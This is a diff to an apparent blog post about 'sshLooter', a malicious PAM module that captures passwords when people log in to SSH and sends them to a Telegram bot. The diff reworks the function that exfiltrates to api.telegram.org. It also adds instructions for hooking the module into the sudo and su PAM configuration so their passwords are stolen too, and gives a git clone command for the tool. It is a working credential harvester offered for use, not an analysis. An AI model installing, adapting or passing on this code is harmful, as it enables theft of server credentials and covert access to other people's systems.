@@ -106,8 +106,9 @@ import requests
 def sendMessage(msg):
     apiKey = "API-KEY"
     userId = "USER-ID"
-    url = "https://api.telegram.org/bot{}/sendMessage?chat_id={}&text={}".format(apiKey,userId,msg)
-    r = requests.get(url)
+    data = {"chat_id":userId,"text":msg}
+    url = "https://api.telegram.org/bot{}/sendMessage".format(apiKey)
+    r = requests.post(url,json=data)
 
 def check_pw(user, password):
     """Check the password matches local unix password on file"""
@@ -159,3 +160,21 @@ echo "$code" > /lib/security/looter.py
 {% endhighlight %}
 In the final, when someone successfuly log on the server you'll receive a message like that.
 ![alt text](/assets/images/telegram-message-ssh-pam.jpg)
+
+#### EDIT 13/02/2018
+
+It works on sudo an su too, just add the line above,
+{% highlight bash %}
+auth requisite pam_python.so looter.py
+{% endhighlight %}
+
+in files
+{% highlight bash %}
+/etc/pam.d/sudo
+/etc/pam.d/su
+{% endhighlight %}
+
+Or just git clone the project and follow the instructions on README.md
+{% highlight bash %}
+git clone https://github.com/mthbernardes/sshLooter.git
+{% endhighlight %}
